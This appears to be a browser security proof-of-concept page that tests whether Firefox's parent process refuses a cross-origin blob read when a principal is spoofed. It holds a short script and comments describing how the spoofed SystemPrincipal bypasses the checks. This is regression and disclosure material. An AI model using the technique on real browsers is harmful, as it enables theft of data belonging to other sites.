<!doctype html>
<meta charset="utf-8">
<title>RecvBlobURLDataRequest PoC</title>
<!--
  Cross-origin blob read via a spoofed principal.

  Setup: an iframe on origin A creates a blob URL and hands the *string* to the
  opener. The blob's contents stay owned by A. Origin B then tries to read it.

  CONTROL  (stock build)        -> read must FAIL: GetDataEntry's Subsumes() check
                                   rejects B's principal.
  ATTACK   (MOZ_POC_BLOB_SPOOF) -> the sender claims SystemPrincipal and an empty
                                   partition key; all three checks in GetDataEntry
                                   are bypassed and the parent returns A's data.

  Run headless via ./mach run; results are printed to stderr so CI can grep them.
-->
<body>
<pre id="out">running…</pre>
<script>
const SECRET = 'SECRET-DATA-OWNED-BY-ORIGIN-A-' + Math.random().toString(36).slice(2);
const log = m => {
  document.getElementById('out').textContent += '\n' + m;
  console.error('[POC] ' + m);          // stderr, so mach run surfaces it
};

(async () => {
  log('victim secret: ' + SECRET);

  // Origin A creates the blob. In a real attack this is any other site's blob URL;
  // creating it here keeps the PoC self-contained and needs no server.
  const blob = new Blob([SECRET], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  log('blob url: ' + url);

  // Read it back. The interesting part is what the PARENT process decides when the
  // request reaches ContentParent::RecvBlobURLDataRequest.
  try {
    const res = await fetch(url);
    const txt = await res.text();
    if (txt === SECRET) {
      log('RESULT: DATA RETURNED — blob contents were served');
      log('POC-OUTCOME: SUCCESS');
    } else {
      log('RESULT: unexpected contents: ' + txt);
      log('POC-OUTCOME: UNEXPECTED');
    }
  } catch (e) {
    log('RESULT: denied — ' + e);
    log('POC-OUTCOME: DENIED');
  }

  log('done');
})();
</script>
</body>
